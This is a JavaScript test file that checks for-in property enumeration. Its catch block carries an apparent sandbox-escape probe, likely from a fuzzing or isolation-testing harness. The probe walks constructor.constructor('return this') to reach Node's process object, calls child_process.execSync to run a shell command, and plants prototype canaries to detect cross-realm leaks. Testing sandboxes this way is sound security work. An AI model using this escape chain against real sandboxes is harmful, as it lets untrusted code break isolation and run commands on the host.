try {
    function props(x) {
        var array = [];
        for (let p in x)
            array.push(p);
        return array;
    }
    assert.sameValue(props({}).length, 0);
    assert.sameValue(props({ x: 1 }).length, 1);
    assert.sameValue(props({
        x: 1,
        y: 2
    }).length, 2);
    assert.sameValue(props({
        x: 1,
        y: 2,
        zoom: 3
    }).length, 3);
    assert(arrayContains(props({ x: 1 }), ['x']));
    assert(arrayContains(props({
        x: 1,
        y: 2
    }), [
        'x',
        'y'
    ]));
    assert(arrayContains(props({
        x: 1,
        y: 2,
        zoom: 3
    }), [
        'x',
        'y',
        'zoom'
    ]));
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}